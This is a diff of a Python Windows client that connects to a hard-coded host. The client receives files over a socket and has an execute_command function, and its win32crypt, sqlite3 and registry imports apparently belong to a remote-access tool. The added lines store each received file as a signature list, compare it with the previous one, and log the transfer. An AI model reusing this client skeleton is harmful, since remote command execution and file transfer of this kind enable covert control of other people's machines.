@@ -2,6 +2,7 @@ import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3,
 import win32api, winerror, win32event, win32crypt
 from shutil import copyfile
 from winreg import *
+import datetime
 
 
 strHost = "10.5.29.45"
@@ -78,19 +79,54 @@ def upload(data):
     file_data = recvall(intBuffer,objSocket)
     strOutputFile = decode_utf8(objSocket.recv(1024))
     try:
-        objFile = open(strOutputFile, "wb")
+        objFile = open("tempSignatures.txt", "wb")
         objFile.write(file_data)
         objFile.close()
         objSocket.send(str.encode("Done!!!"))
     except:
         objSocket.send(str.encode("Path is protected/invalid!"))
 
-    print (objSocket)
-    objSocket.close()
-    print (objSocket)
-    time.sleep(5)
+    result = compareFiles()
+    if(result == True):
+        print (objSocket)
+        objSocket.close()
+        print (objSocket)
+        time.sleep(5)
+    else:
+        transferFiles()
+        saveTransaction()
+    
     # sys.exit(0)
 
+def saveTransaction():
+    currentDT = datetime.datetime.now()
+    currentDT = str(currentDT)
+    with open("Transactions.txt",'a+') as f:
+        f.write("File received at " + currentDT + " from " + strHost + "\n")
+        f.close()
+
+
+def transferFiles():
+    with open ("tempSignatures.txt",'r') as f1:
+        data = f1.read()
+        with open("signatures.txt",'w') as f2:
+            f2.write(data)
+            f2.close()
+        f1.close()
+
+def compareFiles():
+    with open("tempSignatures.txt",'r') as f:
+        lines = f.read().splitlines()
+        lastTempSignature = lines[-1]
+
+    with open("signatures.txt",'r') as f:
+        lines = f.read().splitlines()
+        lastSignature = lines[-1]
+
+    if(lastTempSignature == lastSignature):
+        return True
+    else:
+        return False
 
 def execute_command():
     # try:
